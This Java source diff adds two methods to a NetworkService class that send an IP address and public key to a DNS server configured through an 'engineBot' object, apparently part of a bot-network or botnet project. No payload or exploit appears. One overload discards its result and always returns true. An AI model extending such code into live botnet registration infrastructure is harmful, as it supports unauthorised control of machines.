@@ -339,6 +339,34 @@ public class NetworkService {
 		return Boolean.TRUE;
 	}
 
+	
+	/**
+	 * @param ip
+	 * @param pk
+	 * @return
+	 */
+	public Boolean updateDnsInformation(IP ip, PublicKey pk) {
+
+		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport();
+		Boolean result = false;
+		result = cecReq.sendInfoToDnsServer(url,ip, pk);
+		System.out.println("Ip tornato " + result);
+		return Boolean.TRUE;
+	}
+	/**
+	 * @param ip
+	 * @param pk
+	 * @return
+	 */
+	public Boolean updateDnsInformation(IP ip, String pk) {
+
+		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport();
+		Boolean result = false;
+		result = cecReq.sendInfoToDnsServer(url,ip, pk);
+		System.out.println("Ip tornato " + result);
+		return result;
+	}
+	
 	public boolean updateBotNetwork() {
 		return true;
 	}
